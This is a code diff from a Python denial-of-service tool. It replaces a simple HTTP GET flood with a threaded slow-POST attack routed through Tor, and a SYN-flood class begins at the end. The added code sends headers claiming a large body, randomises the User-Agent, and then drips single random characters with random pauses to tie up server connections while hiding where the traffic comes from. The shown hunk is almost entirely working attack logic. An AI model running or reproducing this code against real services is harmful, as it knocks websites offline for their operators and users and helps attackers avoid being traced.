@@ -7,24 +7,36 @@ running = True
 count = 0
 
 class httpDos():
-    def __init__(self, host, port=80):
+    def __init__(self, host, port, tor):
+        Thread.__init__(self)
         self.host = host
         self.port = port
-        self.run(host, port)
-    def run(self, host, port):
-        while running:
-            ip = socket.gethostbyname(host)
-            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            msg = 'Null'
-            try:
-                dos.connect((host, 80))
-                dos.send("GET / HTTP/1.1\r\n")
-                dos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
-                global count; count+=1
-            except socket.error:
-                print "[!] Unknown Host"
-                dos.close()
-                sys.exit(1)
+        self.socks = socks.socksocket()
+        self.tor = tor
+        self.running = True
+		
+    def _send_http_post(self, pause=10):
+        global stop_now
+
+        self.socks.send("POST / HTTP/1.1\r\n"
+                        "Host: %s\r\n"
+                        "User-Agent: %s\r\n"
+                        "Connection: keep-alive\r\n"
+                        "Keep-Alive: 900\r\n"
+                        "Content-Length: 10000\r\n"
+                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                        (self.host, random.choice(useragents)))
+
+        for i in range(0, 9999):
+            if stop_now:
+                self.running = False
+                break
+            p = random.choice(string.letters+string.digits)
+            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
+            self.socks.send(p)
+            time.sleep(random.uniform(0.1, 3))
+	
+        self.socks.close()
 
 class synFlood():
     def __init__(self, ip, port):
